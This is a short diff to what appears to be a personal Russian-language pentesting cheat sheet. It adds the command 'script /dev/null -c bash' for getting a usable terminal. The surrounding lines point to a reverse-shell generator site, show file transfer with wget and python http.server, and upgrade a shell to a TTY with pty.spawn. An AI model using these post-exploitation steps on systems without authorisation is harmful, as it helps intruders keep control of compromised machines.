@@ -66,6 +66,9 @@ https://www.revshells.com/
 wget https://example.com/file.zip - стянуть файйл с сервера. У себя сервер - python3 -m http.server 8080
 
 
+Запустить терминал
+
+script /dev/null -c bash
 
 повысить до tty командой 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
